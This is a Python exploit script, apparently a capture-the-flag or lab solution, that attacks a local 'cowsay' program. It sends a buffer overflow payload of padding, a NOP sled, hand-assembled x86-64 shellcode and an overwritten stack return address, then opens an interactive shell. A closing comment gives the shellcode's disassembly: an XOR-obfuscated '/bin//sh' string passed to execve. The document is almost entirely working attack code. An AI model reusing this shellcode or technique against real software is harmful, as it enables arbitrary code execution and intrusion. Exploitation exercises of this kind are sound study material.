import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()

p.readuntil('Enter a string to cowsay: ')

shell = "A" * 20  + "\x90" * 27 + "\x31\xF6\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x49\xC7\xC5\xFF\xFF\xFF\xFF\x4C\x31\xEB\x56\x53\x54\x5F\x48\x31\xC0\x48\x83\xC0\x3A\x48\x83\xC0\x01\x31\xD2\x0F\x05" + "\x90" * 31 + "\x90\xed\xff\xff\xff\x7f"

p.sendline(shell)

p.interactive()

"""
xor esi, esi                   
movabs rbx, 0xFF978CD091969DD0
mov r13, 0xFFFFFFFFFFFFFFFF
xor rbx, r13 
push rsi
push rbx
push rsp
pop rdi
xor rax, rax
add rax, 58
add rax, 1
xor edx, edx
syscall
"""
